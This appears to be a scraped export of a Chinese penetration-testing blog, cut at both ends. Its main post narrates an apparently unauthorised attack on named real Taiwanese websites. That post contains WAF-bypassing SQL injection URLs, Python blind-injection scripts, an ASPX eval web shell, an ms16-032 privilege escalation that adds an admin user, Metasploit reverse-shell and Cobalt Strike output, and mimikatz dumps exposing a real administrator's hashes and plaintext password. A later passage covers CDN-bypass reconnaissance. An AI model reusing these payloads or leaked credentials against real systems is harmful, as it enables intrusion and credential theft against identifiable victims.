Win2012123456789101112KB3139914|MS16-032KB3124280|MS16-016KB3134228|MS16-014KB3079904|MS15-097KB3077657|MS15-077KB3045171|MS15-051KB3000061|MS14-058KB2829361|MS13-046KB2850851|MS13-053EPATHOBJ 0day 限32位KB2707511|MS12-042 sysret -pidKB2124261|KB2271195 MS10-065 IIS7KB970483|MS09-020IIS6","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"渗透测试--SQL注入漏洞手注练习","slug":"渗透测试--SQL注入漏洞手注练习","date":"2020-10-23T13:21:43.000Z","updated":"2020-11-20T16:59:42.123Z","comments":true,"path":"2020/10/23/渗透测试--SQL注入漏洞手注练习/","link":"","permalink":"http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E6%B3%A8%E7%BB%83%E4%B9%A0/","excerpt":"","text":"SQL注入漏洞手注练习Exp1判断字符、数字型、闭合方式报错 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890%27 1Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517 正常回显 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890%27--+ union联合注入判断字段数量正常回显 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; order by 6-- 输出错误 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; order by 7-- 判断字段数量为6。 回显显示位WAF拦截 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union select 1,2,3,4,5,6-- 拦截 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union select-- 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union-- 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; select-- 不拦截 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union sel&#x2F;**&#x2F;ect-- 报错 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union sele&#x2F;**&#x2F;ct 1,2,3,4,5,6-- 1Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517 报错注入WAF拦截 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; and updatexml(0,concat(0x7e,database(),0x7e),0)-- WAF不拦截但是报错 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; and updat&#x2F;**&#x2F;exml(0,co&#x2F;**&#x2F;ncat(0x7e,database(),0x7e),0)-- 1Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517 盲注延时盲注页面正常回显。 1http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; and if(length(database())&#x3D;13,1,0)-- 延时注入POC判断数据库长度1234567891011121314151617181920212223242526272829303132333435363738394041from fake_useragent import UserAgent from lxml import etreeimport requestsimport reimport timedef crawl(url,headers): r=requests.get(url=url,headers=headers) return r.textdef analysis_node(html_content): html = etree.HTML(html_content) content = html.xpath(&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;) return contentdef get_database_len(url): print(&quot;开始判断数据库的长度————————————————————————————————————————————————————————————————————————————————————————————&quot;) min_length=1 max_length=15 database_length=harf_find(min_length,max_length,url) print(&quot;数据库的长度为：&quot;+str(database_length)) print(&quot;数据库长度判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;)def harf_find(min_value,max_value,url): while(min_value&lt;=max_value): mid_value=int((min_value+max_value)/2) print(mid_value) url=&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(length(database())&gt;%d,1,0)--+&quot;%mid_value print(&quot;当前url为:&quot;+url)# time.sleep(10) html_content=crawl(url,headers) last_content=analysis_node(html_content) print(last_content) if last_content: min_value=mid_value+1 else: max_value=mid_value-1 mid_value=int((min_value+max_value+1)/2) return mid_valueif __name__ == &quot;__main__&quot;: ua = UserAgent() headers=&#123;&#x27;User-Agent&#x27;:ua.random&#125; database_length_url=&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(length(database())&gt;%d,1,0)--+&quot; get_database_len(database_length_url) 判断数据库名字1234567891011121314151617181920212223242526272829303132333435363738394041424344from fake_useragent import UserAgent from lxml import etreeimport requestsimport reimport timedef crawl(url,headers): r=requests.get(url=url,headers=headers) return r.textdef analysis_node(html_content): html = etree.HTML(html_content) content = html.xpath(&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;) return contentdef get_database_data(url,database_length,payload): database_name=&quot;&quot; print(&quot;开始判断数据库的名字————————————————————————————————————————————————————————————————————————————————————————————&quot;) min_length=1 max_length=126 for i in range(1,database_length): payload=&quot;&#x27; and if(ascii(substr(database(),%d,1))&gt;&quot;%i database_name+=chr(harf_find(min_length,max_length,url,payload)) print(&quot;数据库的名字为：&quot;+database_name) print(&quot;数据库名字判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;)def harf_find(min_value,max_value,url,payload): while(min_value&lt;=max_value): mid_value=int((min_value+max_value)/2) url=&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890%s%d,1,0)--+&quot;%(payload,mid_value) print(&quot;当前url为:&quot;+url) html_content=crawl(url,headers) last_content=analysis_node(html_content) print(last_content) if last_content: min_value=mid_value+1 else: max_value=mid_value-1 mid_value=int((min_value+max_value+1)/2) return mid_valueif __name__ == &quot;__main__&quot;: ua = UserAgent() headers=&#123;&#x27;User-Agent&#x27;:ua.random&#125; database_data_url=&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&quot; payload=&quot;&#x27; and if(ascii(substr(database(),%d,1))&gt;&quot; database_length=13 get_database_data(database_data_url,database_length,payload) 判断表的长度1234567891011121314151617181920212223242526272829303132333435363738394041424344from fake_useragent import UserAgent from lxml import etreeimport requestsimport reimport timedef crawl(url,headers): r=requests.get(url=url,headers=headers) return r.textdef analysis_node(html_content): html = etree.HTML(html_content) content = html.xpath(&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;) return contentdef waf_analysis_node(html_content): html = etree.HTML(html_content) content = html.xpath(&quot;//head/title/text()&quot;) return contentdef get_table_length(url): print(&quot;开始判断表的长度————————————————————————————————————————————————————————————————————————————————————————————&quot;) min_length=1 max_length=15 for i in range(min_length,max_length): url=&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)=%d,1,0)--+&quot;%i table_length=harf_find(min_length,max_length,url) print(&quot;表的长度为：&quot;+str(table_length)) print(&quot;表的长度判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;)def harf_find(min_value,max_value,url): while(min_value&lt;=max_value): mid_value=int((min_value+max_value)/2) print(&quot;当前url为:&quot;+url) html_content=crawl(url,headers) last_content=analysis_node(html_content) print(last_content) if last_content: min_value=mid_value+1 else: max_value=mid_value-1 mid_value=int((min_value+max_value+1)/2) return mid_valueif __name__ == &quot;__main__&quot;: ua = UserAgent() headers=&#123;&#x27;User-Agent&#x27;:ua.random&#125; table_length_url=&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)=&#123;&#125;,1,0)--+&quot; get_table_length(table_length_url) 判断表的名字 1&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))=&#123;&#125;,1,0)--+&quot; 判断列的长度 1&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(column_name) from information_schema.columns where table_name = test limit 0,1)=&#123;&#125;,1,0)--+&quot; 判断列的名字 1&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name = test limit 0,1),1,1))=&#123;&#125;,1,0)--+&quot; 判断字段的长度1&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(user) from test)=&#123;&#125;,1,0)--+&quot; 判断字段的内容 1&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select user from test),1,1))=&#123;&#125;,1,0)--+&quot; Exp2数据库为sqlserver 判断字符、数字型、闭合方式12345Microsoft OLE DB Provider for SQL Server 错误 &#x27;80040e14&#x27;遗漏字元字串 &#x27; AND 显示状态Flag = 1 ORDER BY 排序 DESC &#x27; 后面的引号。D:\\S_JCIN\\WEBSITE\\OUTWEB\\L_CT\\NEWS\\../../../_sysadm/_Function/DB_Function.asp, 列158 数字型。 判断是否是DBA 12and 1&#x3D;(select is_srvrolemember(&#39;sysadmin&#39;))select is_srvrolemember(&#39;sysadmin&#39;) 判断是否是站库分离1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select host_name()))--&amp;Pageno&#x3D;1 1将 nvarchar 值 &#39;RENHAI&#39; 转换成资料类型 int 时，转换失败。 1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select @@servername))--&amp;Pageno&#x3D;1 1将 nvarchar 值 &#39;RENHAI&#39; 转换成资料类型 int 时，转换失败。 主机名和服务器名一样，不是站库分离。 报错注入12345671=convert(int,(db_name())) #获取当前数据库名1=convert(int,(@@version)) #获取数据库版本1=convert(int,(select quotename(name) from master..sysdatabases FOR XML PATH(&#x27;&#x27;))) #一次性获取全部数据库1=convert(int,(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from master..sysdatabases FOR XML PATH(&#x27;&#x27;))) #一次性获取全部数据库 获取数据库1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select &#39;|&#39; name &#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;)))&amp;Pageno&#x3D;1 1将 nvarchar 值 &#39;|master||tempdb||model||msdb||RenHai||RenHai2012||Renhai_LightSite||RenhaiDevelop||RenHai2012_bak|&#39; 转换成资料类型 int 时，转换失败。 USER信息123and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;)) #查看是否为db_owner权限、sysadmin、public （未测试成功）如果正确则正常，否则报错1&#x3D;convert(int,(user)) #查看连接数据库的用户 1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;public&#39;))--&amp;Pageno&#x3D;1 返回正常。 1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;))--&amp;Pageno&#x3D;1 1可能是 BOF 或 EOF 的值为 True，或目前的资料录已被删除。所要求的操作需要目前的资料录。 1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(user))--&amp;Pageno&#x3D;1 1将 nvarchar 值 &#39;dbo&#39; 转换成资料类型 int 时，转换失败。 获取表名1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select quotename(name) from RenHai..sysobjects where xtype&#x3D;&#39;U&#39; FOR XML PATH(&#39;&#39;)))&amp;Pageno&#x3D;1 1将nvarchar 值&#39;[参数表][_WebVisitData][活动相簿主档][活动相簿分类][活动相簿内容][comd_list][D99_CMD][D99_Tmp][comdlist][jiaozhu][职称][订单明细暂存档][会员资料表][订单主档][订单明细档][登入纪录档][产品资料表][sysdiagrams][网站流量][系统设定档][sqlmapoutput][订单暂存档][流水号资料表][订单分类档][单位][订单状态档][太岁表][点灯位置资料表][性别表][庙宇资料表][一般分类][人员][公司基本资料] [人员权限][单位权限][权限][新闻][程式][dtproperties]&#39; 转换成资料类型int 时，转换失败。 获取列名获取注入点的表中的列名1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 having 1&#x3D;1 --&amp;Pageno&#x3D;1 1资料行 &#39;新闻.流水号&#39; 在选取清单中无效，因为它并未包含在汇总函式或 GROUP BY 子句中。 获取任意表中的列名1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select * from RenHai..comd_list where id&#x3D;(select max(id) from test..sysobjects where xtype&#x3D;&#39;u&#39; and name&#x3D;&#39;comd_list&#39;)))&amp;Pageno&#x3D;1 获取数据获取shell判断权限1http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264%20and%201&#x3D;(select%20is_srvrolemember(%27sysadmin%27))--&amp;Pageno&#x3D;1 返回正常 sqlmap一把梭。 1➜ ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; -p p0 --os-shell 根据之前爆出的路径，尝试写入shell。 12D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;os-shell&gt; echo &#39;&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&#39;&gt;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady2.aspx 回显太慢。 12345678910111213os-shell&gt; echo &#39;&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&#39;&gt;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady2.aspxdo you want to retrieve the command standard output? [Y&#x2F;n&#x2F;a] y[14:13:34] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#39;--no-cast&#39; or switch &#39;--hex&#39;[14:13:34] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval[14:13:34] [INFO] retrieved:[14:13:35] [WARNING] time-based comparison requires larger statistical model, please wait..................... (done)[14:13:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptionsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y&#x2F;n] y2[14:13:58] [INFO] retrieved:[14:13:59] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)[14:14:14] [INFO] adjusting time delay to 2 seconds due to good response times這 直接尝试sqlmap的–file选项 1➜ ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; --file-write&#x3D;&quot;&#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;漏洞盒子&#x2F;shell&#x2F;apsx马&#x2F;asp小马&#x2F;2.aspx&quot; --file-dest&#x3D;&quot;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady123.aspx&quot; 使用os-shell命令，查看是否上传上去。 1234567os-shell&gt; dir D:\\S_JCIN\\WEBSITE\\OUTWEB\\L_CT\\NEWS\\2020&#x2F;11&#x2F;17 上午 09:08 9 shell.aspx2014&#x2F;12&#x2F;17 下午 05:40 277 sidebar.asp2020&#x2F;11&#x2F;17 上午 10:55 116 steady.aspx2020&#x2F;11&#x2F;17 上午 10:56 116 steady.txt2020&#x2F;11&#x2F;17 上午 11:24 8 steady1.txt2020&#x2F;11&#x2F;17 下午 02:28 116 steady123.aspx 查看马是否连接成功 12345678910111213os-shell&gt; type D:\\S_JCIN\\WEBSITE\\OUTWEB\\L_CT\\NEWS\\steady123.aspxdo you want to retrieve the command standard output? [Y/n/a] y[14:36:13] [INFO] retrieved: &#x27;&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&#x27;[14:36:13] [INFO] retrieved: &#x27;&lt;%var PAY:String=Request[&quot;\\x61\\x62\\x63\\x64&quot;];&#x27;[14:36:13] [INFO] retrieved: &#x27;eval(PAY,&quot;\\x75\\x6E\\x73\\x61&quot;+&quot;\\x66\\x65&quot;);&#x27;[14:36:14] [INFO] retrieved: &#x27;%&gt;&#x27;command standard output:---&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&lt;%var PAY:String=Request[&quot;abcd&quot;];eval(PAY,&quot;unsa&quot;+&quot;fe&quot;);%&gt;--- 提权使用ms16-032直接提权成功，添加用户，添加用户到管理员组。 123456789101112131415161718D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; ms16-032.exe &quot;whoami&quot;[#] ms16-032 for service by zcgonvh[+] SeAssignPrimaryTokenPrivilege was assigned[!] process with pid: 5364 created.==============================nt authority\\systemD:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; ms16-032.exe &quot;net user good gongxinao /add&quot;[#] ms16-032 for service by zcgonvh[+] SeAssignPrimaryTokenPrivilege was assigned[!] process with pid: 1668 created.==============================命令執行成功。D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; ms16-032.exe &quot;net localgroup administrators good /add&quot;[#] ms16-032 for service by zcgonvh[+] SeAssignPrimaryTokenPrivilege was assigned[!] process with pid: 364 created.==============================命令執行成功 查看3389是否连接成功，返回为0表示连接成功。 123D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnectionsHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server fDenyTSConnections REG_DWORD 0x0 既然是ms16-032直接msf。 1234567891011msf6 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp[*] Started reverse TCP handler on 164.155.95.55:4444 [+] Compressed size: 1016[*] Writing payload file, C:\\WINDOWS\\TEMP\\EnCngJ.ps1...[*] Compressing script contents...[+] Compressed size: 3564[*] Executing exploit script...[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.[+] Deleted C:\\WINDOWS\\TEMP\\EnCngJ.ps1[-] run: Interrupted 最后连接超时，百度一下原因发现。改模块需要目标系统具有powershell，而03的系统肯定是没有powershell的，但是问题来了为什么exe文件就可以提权，msf就不可以？两者的原理都是一样的，无非是形式不一样。 既然能够运行exp.exe，查看一下进程。 1234567891011meterpreter &gt; ps 5012 5372 notepad.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\notepad.exe 5060 2012 cmd.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\cmd.exe 5096 5288 notepad.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\notepad.exe 5224 2012 cmd.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\cmd.exe 5240 2012 cmd.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\cmd.exe 5288 2012 cmd.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\cmd.exe 5372 2012 cmd.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\cmd.exe 5640 5644 cmd.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\cmd.exe 5672 4532 powershell.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\System32\\windowspowershell\\v1.0\\powershell.exe 6032 4532 powershell.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\System32\\windowspowershell\\v1.0\\powershell.exe 发现有powershell.exe。 最后直接连接3389，找到我们上传的迷你卡姿抓取密码，这里为了方便直接倒入到文件中，然后使用蚁剑下载到本地，拿到管理员账号密码。 1234567891011121314151617181920212223242526272829303132333435 .#####. mimikatz 2.2.0 (x86) #19041 Sep 18 2020 19:18:00 .## ^ ##. &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; https://blog.gentilkiwi.com/mimikatz &#x27;## v ##&#x27; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#x27;#####&#x27; &gt; https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege &#x27;20&#x27; OKmimikatz(commandline) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 78368 (00000000:00013220)Session : Service from 0User Name : AdministratorDomain : RENHAILogon Server : RENHAILogon Time : 2020/11/20 SID : S-1-5-21-2928085508-3031473165-2762439012-500 msv : [00000002] Primary * Username : Administrator * Domain : RENHAI * LM : d7b9834aa4c07e3bd8265b84d6256f93 * NTLM : 2a40e70e764833f30c1c804f5709dba2 * SHA1 : aa34ec6af75a3813a158c3e95a475602f25b5a34 wdigest : * Username : Administrator * Domain : RENHAI * Password : 168renhai kerberos : * Username : Administrator * Domain : RENHAI * Password : 168renhai 接下来就等着晚上上线管理员了。 然后我们接着看一下msf使用ms16这个洞报错的原因，首先目标系统是肯定有ps的。再一次启动msf查看报错信息。 12345678910msf6 exploit(windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc) &gt; run[*] Started reverse TCP handler on 164.155.95.55:4444 [+] Compressed size: 1016[*] Writing payload file, C:\\DOCUME~1\\good\\LOCALS~1\\Temp\\1\\VcDqmVnyed.ps1...[*] Compressing script contents...[+] Compressed size: 3596[*] Executing exploit script...[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.[-] run: Interrupted 可以看到ps文件存在于C:\\DOCUME~1\\good\\LOCALS~1\\Temp\\1\\VcDqmVnyed.ps1..。我们到目标机器下面查看一下。 可以看到目标系统上传了ps文件。我们直接使用ps执行ps脚本，发现报红而且闪退。大概这就是msf不能正常使用的原因吧。管理员权限不能使用ps，接着我们晚上偷摸的登录管理员用户，这时候就是system权限，然后调用ps。运行对应的脚本发现： 123456D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News\\Invoke-MS16-032.ps1 檔案無法載入，因為這個系統上已停用指令碼執行。如需詳細資訊，請參閱 &quot;get-help about_signing&quot;。位於 行:1 字元:55+ D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News\\Invoke-MS16-032.ps1 &lt;&lt;&lt;&lt; + CategoryInfo : NotSpecified: (:) [], PSSecurityException + FullyQualifiedErrorId : RuntimeException 这是由于powershell的默认执行权限为Restricted：脚本不能运行（默认设置）。 查看一下当前powershell的默认执行权限： 12PS C:\\Documents and Settings\\Administrator&gt; Get-ExecutionPolicyRestricted 设置一下权限 1234567891011PS C:\\Documents and Settings\\Administrator&gt; Get-ExecutionPolicyRestrictedPS C:\\Documents and Settings\\Administrator&gt; Set-ExecutionPolicy Unrestricted執行原則變更執行原則有助於防範您不信任的指令碼。如果變更執行原則，可能會使您接觸到about_Execution_Policies 說明主題中所述的安全性風險。您要變更執行原則嗎?[Y] 是(Y) [N] 否(N) [S] 暫停(S) [?] 說明 (預設值為 &quot;Y&quot;): yPS C:\\Documents and Settings\\Administrator&gt; Get-ExecutionPolicyUnrestrictedPS C:\\Documents and Settings\\Administrator&gt; 这时候可以运行powershell脚本。 然后在管理员用户下运行cs马，反弹一个shell这时候就是system权限。 12345678beacon&gt; sleep 0[*] Tasked beacon to become interactive[+] host called home, sent: 16 bytesbeacon&gt; shell whoami[*] Tasked beacon to run: whoami[+] host called home, sent: 37 bytes[+] received output:renhai\\administrator","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"一个网站的渗透思路","slug":"渗透测试--一个网站的渗透思路","date":"2020-10-23T13:21:43.000Z","updated":"2020-11-17T02:57:48.126Z","comments":true,"path":"2020/10/23/渗透测试--一个网站的渗透思路/","link":"","permalink":"http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/","excerpt":"","text":"一个网站的渗透思路信息收集信息收集网站 1https:&#x2F;&#x2F;www.shodan.io&#x2F; 判断网站是否存在cdn 什么是cdn？ CDN的全称是Content Delivery Network，即内容分发网络。其目的是通过在现有的internet中增加一层新的网络架构，将网站的内容发布到最接近用户的网络边缘，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。 具体流程为: 用户在自己的浏览器中输入要访问的网站的域名，浏览器向本地DNS请求对该域名的解析，本地DNS将请求发到网站的主DNS，主DNS根据一系列的策略确定当时最适当的CDN节点，并将解析的结果（IP地址）发给用户，用户向给定的CDN节点请求相应网站的内容。 为什么要绕过cdn？ 由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。 判断是否有cdn的方式 Nslookup命令–查看是否返回多个IP，如果返回多个IP则表示存在CDN，否则可能不存在CDN。 可以看到有多个IP。 1234567891011➜ ~ nslookup jd.comServer: 114.114.114.114Address: 114.114.114.114#53Non-authoritative answer:Name: jd.comAddress: 111.13.149.108Name: jd.comAddress: 120.52.148.118Name: jd.comAddress: 118.193.98.63 使用在线网站查看–如果有多个IP则存在CDN，如果只有一个IP则不存在CDN 常见网站 12爱站: https:&#x2F;&#x2F;ping.aizhan.com&#x2F;站长之家: http:&#x2F;&#x2F;ping.chinaz.com&#x2F; 使用工具直接查询 1https:&#x2F;&#x2F;www.ipip.net&#x2F;ip.html 绕过CDN的方式 查找子域名 因为CDN架设需要钱，所以有的站点只给主域名架上CDN，而子域名一般不架设CDN。 1231.oneforall 查找子域名2、Google hacker 查找子域名3、site:baidu.com -www 让服务器主动给我们发送邮箱，邮箱系统很多都在内部，没有经过解析，可以在邮件源码里面找到服务的真实的 历史DNS记录 查询ip与域名绑定历史记录，会发现使用cdn之前的目标ip。 使用网站查询之前绑定的域名。 123456https:&#x2F;&#x2F;www.ip138.com&#x2F;https:&#x2F;&#x2F;dnsdb.io&#x2F;zh-cn&#x2F;https:&#x2F;&#x2F;x.threatbook.cn&#x2F;https:&#x2F;&#x2F;sitereport.netcraft.com&#x2F;http:&#x2F;&#x2F;viewdns.info&#x2F;http:&#x2F;&#x2F;www.17ce.com&#x2F; 利用网站漏洞 phpinfo敏感信息泄漏等等，如果存在web漏洞让服务器主动向我们请求链接，我们可以获取目标站点的真实ip。 可以尝试反弹shell到我们的主机。 cert证书查询 转化成十进制,使用fofa搜索。 fofa语法–cert=&quot;十进制&quot; 在国外ping–网站在国外没有CDN 使用国外的网站ping 1https:&#x2F;&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php 绕过之后开始渗透 把真实的ip与目标域名在hosts文件中绑定。 或者直接访问目标的ip而不是访问域名。 网站信息 使用burp抓包、放包，在返回包中可以看到使用的系统、脚本语言、服务类型以及waf类型等等。 12345678HTTP&#x2F;1.1 200 OKContent-Type: text&#x2F;html; charset&#x3D;gb2312Vary: Accept-EncodingServer: Microsoft-IIS&#x2F;8.5X-Powered-By: WAF&#x2F;2.0Date: Mon, 21 Sep 2020 12:02:33 GMTConnection: closeContent-Length: 9173 使用谷歌插件–Wappalyzer 查看网站的基本信息，比如web服务、脚本语言等等。 判断数据库类型 数据库本身的特性 